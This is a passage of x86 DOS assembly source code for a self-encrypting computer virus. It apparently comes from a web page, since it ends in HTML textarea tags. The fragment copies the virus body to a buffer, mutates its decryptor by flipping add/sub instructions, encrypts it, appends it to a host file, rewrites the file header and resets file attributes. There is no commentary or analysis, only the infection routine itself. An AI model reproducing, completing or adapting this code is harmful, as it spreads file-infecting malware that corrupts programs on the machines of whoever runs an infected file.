          xor  byte ptr encrypt+(decrypt_loop-startvirus)+2,028h ; flip between add/sub

          xor  si,si                    ; copy virus to buffer
          mov  di,offset zopystuff
          mov  cx,heap-startvirus
          rep  movsb

          mov  si,offset encrypt        ; copy encryption function
          mov  di,offset zopystuff
          mov  cx,startencrypt-decrypt
          rep  movsb

          xor  byte ptr zopystuff+(decrypt_loop-startvirus)+2,028h ; flip between add/sub

          mov  word ptr [encrypt+(patch_startencrypt-startvirus)+1],offset zopystuff+(startencrypt-decrypt)

          call encrypt

          mov  ah,40h                   ; Concatenate virus
          mov  dx,offset zopystuff
          mov  cx,heap-startvirus       ; # bytes to write
          int  21h

          mov  ax,4200h                 ; Move file pointer
          xor  cx,cx                    ; to beginning of file
          cwd                           ; xor dx,dx
          int  21h

          mov  ah,40h                   ; Write to file
          mov  dx,offset buffer         ; Write from buffer
          pop  cx                       ; cx bytes
          int  21h

          jmp  done_file

attributes:
          mov  ax,4301h                 ; Set attributes to cx
          int  21h
          ret

heap:                                   ; Variables not in code
filesize  dd ?
encrypt:  db startencrypt-decrypt+1 dup (?)
zopystuff db heap-startvirus dup (?)    ; Encryption buffer
buffer    db 1ah dup (?)                ; read buffer
last      db 090h
endheap:                                ; End of virus
end       startvirus

</textarea></td></tr></table></body></html>
